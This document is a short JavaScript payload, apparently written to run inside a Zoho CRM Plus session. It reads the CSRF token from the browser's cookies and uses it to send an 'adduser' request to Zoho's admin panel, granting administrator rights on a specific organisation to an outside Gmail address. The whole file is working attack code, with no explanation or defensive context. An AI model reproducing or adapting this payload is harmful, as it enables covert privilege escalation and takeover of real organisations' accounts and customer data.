var department, departmentRes;
var cookie = document.cookie.split(';');
for (i = 0; i < cookie.length; i++) {
    if ((cookie[i]).startsWith(" CT_CSRF") == true) {
        csrf = "cmcsrfparam=" + (cookie[i]).split('=')[1];
    }
}

$.ajax({
    url: "https://crmplus.zoho.com/supportapi/api/v1/departments?orgId=4241905",
    type: "GET",
    success: function(r) {
        departmentRes = r.data[0].id;
        var params = {
            data: "{\"email_id\":\"masonhering7@gmail.com\",\"last_name\":\"MasonHering\",\"apps\":[{\"app_name\":\"support\",\"zaaid\":\"4241905\",\"is_light_user\":false,\"is_service_admin\":false,\"is_admin\":true,\"is_agent\":false,\"departments\":[{\"department_id\":\"4000000097799\",\"chat_enabled\":false}],\"skip_no_permission\":true}],\"is_active\":true}",
            action: "adduser"
        };
        $.ajax({
            url: "https://crmplus.zoho.com/zohocorp/adminpanel.do",
            type: "POST",
            data: params,
            headers: {
                "X-ZCSRF-TOKEN": csrf
            }
        });
    }
});
